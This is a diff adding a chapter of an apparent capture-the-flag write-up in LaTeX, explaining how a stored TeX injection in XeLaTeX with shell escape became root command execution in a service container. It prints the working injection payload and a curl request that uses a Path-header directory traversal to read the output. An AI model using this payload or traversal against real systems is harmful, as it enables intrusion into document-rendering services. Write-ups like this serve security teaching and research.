@@ -1,0 +1,241 @@
+% ============================================================
+% 05 -- FROM TEX INJECTION TO RCE
+% ============================================================
+
+\section{From TeX Injection to Container-Root RCE}
+\label{sec:rce}
+
+At this point, attacker-controlled data could survive a trip through
+MariaDB and later become TeX again.
+
+The remaining question was:
+
+\begin{center}
+  \displayfont\large\bfseries
+  can that TeX make XeLaTeX execute a shell command?
+\end{center}
+
+Because the service was running with \code{--shell-escape}, the answer
+was yes.
+
+
+% ------------------------------------------------------------
+% 5.1
+% ------------------------------------------------------------
+
+\subsection{The Working Payload}
+
+The compact payload that turned the component-type injection into command
+execution was:
+
+\begin{lstlisting}
+^^5cUseName{@@input}|"id>/x"
+\end{lstlisting}
+
+At first glance this looks slightly cursed.
+
+Broken into pieces, however, it is manageable:
+
+\begin{center}
+\begin{tabular}{p{0.31\textwidth} p{0.58\textwidth}}
+  \toprule
+  \textbf{Part} & \textbf{Purpose} \\
+  \midrule
+
+  \code{\^{}\^{}5c} &
+  Produces the backslash character required to begin a TeX control
+  sequence. \\[0.5em]
+
+  \code{UseName\{@@input\}} &
+  Resolves LaTeX's internal input primitive. \\[0.5em]
+
+  \code{|"id>/x"} &
+  Uses the shell-enabled pipe form of the input operation and runs the
+  command \code{id>/x}. \\
+
+  \bottomrule
+\end{tabular}
+\end{center}
+
+
+% ------------------------------------------------------------
+% 5.2
+% ------------------------------------------------------------
+
+\subsection{Why \texttt{@@input}?}
+
+A normal TeX file include may look like:
+
+\begin{lstlisting}
+\input{file.tex}
+\end{lstlisting}
+
+During testing, the useful form was instead:
+
+\begin{lstlisting}
+\UseName{@@input}
+\end{lstlisting}
+
+This provided access to the internal input primitive used by LaTeX.
+
+With shell escape enabled, the input mechanism also supports a pipe form:
+
+\begin{lstlisting}
+\UseName{@@input}|"command"
+\end{lstlisting}
+
+Instead of opening a normal file, XeLaTeX executes the supplied command.
+
+The command's output can then be treated as input by TeX.
+
+For exploitation, however, we did not actually need to consume the
+command output inside the document.
+
+Redirecting it into a file was much simpler.
+
+
+% ------------------------------------------------------------
+% 5.3
+% ------------------------------------------------------------
+
+\subsection{A Tiny Proof of Execution}
+
+The initial proof used:
+
+\begin{lstlisting}
+id>/x
+\end{lstlisting}
+
+This resulted in the complete injected value:
+
+\begin{lstlisting}
+^^5cUseName{@@input}|"id>/x"
+\end{lstlisting}
+
+Once stored as the component type and rendered, the effective execution
+path became:
+
+\begin{center}
+  \displayfont
+  component type
+  $\longrightarrow$
+  \code{\textbackslash edef}
+  $\longrightarrow$
+  \code{\textbackslash UseName\{@@input\}}
+  $\longrightarrow$
+  shell command
+\end{center}
+
+The command itself wrote the result of \code{id} into:
+
+\begin{lstlisting}
+/x
+\end{lstlisting}
+
+
+% ------------------------------------------------------------
+% 5.4
+% ------------------------------------------------------------
+
+\subsection{Getting the Output Back}
+
+This is where the earlier \code{Path} vulnerability immediately became
+useful again.
+
+The result file could be retrieved with the existing file-read primitive:
+
+\begin{lstlisting}
+curl -g -6 --noproxy '*' \
+  --path-as-is \
+  -H 'Path: /../../x' \
+  'http://[TARGET]:1337/'
+\end{lstlisting}
+
+The returned content showed that the command was executing as root inside
+the LAMP service container:
+
+\begin{lstlisting}
+uid=0(root) gid=0(root) groups=0(root)
+\end{lstlisting}
+
+The chain had therefore reached:
+
+\begin{center}
+  \displayfont\large\bfseries
+  container-root remote command execution
+\end{center}
+
+
+% ------------------------------------------------------------
+% 5.5
+% ------------------------------------------------------------
+
+\subsection{The Chain So Far}
+
+At this stage, the attack was already a complete RCE chain:
+
+\begin{center}
+\begin{tabular}{c}
+  HTTP \code{typ} parameter \\[0.3em]
+  $\downarrow$ \\[0.3em]
+  stored in MariaDB \\[0.3em]
+  $\downarrow$ \\[0.3em]
+  reconstructed through \code{\textbackslash edef} \\[0.3em]
+  $\downarrow$ \\[0.3em]
+  \code{\^{}\^{}5c} becomes \code{\textbackslash} \\[0.3em]
+  $\downarrow$ \\[0.3em]
+  \code{\textbackslash UseName\{@@input\}} \\[0.3em]
+  $\downarrow$ \\[0.3em]
+  shell escape \\[0.3em]
+  $\downarrow$ \\[0.3em]
+  command output written to a file \\[0.3em]
+  $\downarrow$ \\[0.3em]
+  \code{Path:} traversal retrieves the result
+\end{tabular}
+\end{center}
+
+\begin{findingbox}
+The \code{typ} parameter was sufficient to turn stored application data
+into operating-system command execution.
+
+Because XeLaTeX ran as root inside the service container, the resulting
+commands also executed as root inside that container.
+\end{findingbox}
+
+
+% ------------------------------------------------------------
+% 5.6
+% ------------------------------------------------------------
+
+\subsection{Unfortunately, 32 Bytes}
+
+There was one fairly significant problem.
+
+The component type was not an unlimited string.
+
+The MariaDB field only gave us a very small payload budget.
+
+Simple commands such as:
+
+\begin{lstlisting}
+id>/x
+\end{lstlisting}
+
+fit comfortably.
+
+A useful flag-harvesting command did not.
+
+A reverse shell, a longer filesystem search, or even a convenient
+multi-stage command quickly exceeded the available space.
+
+So although we technically had root command execution, it initially
+looked like this:
+
+\begin{center}
+  \displayfont\bfseries
+  root RCE, but make it tiny.
+\end{center}
+
+The next problem was therefore not finding another execution primitive.
+
+It was finding somewhere else to store the command.
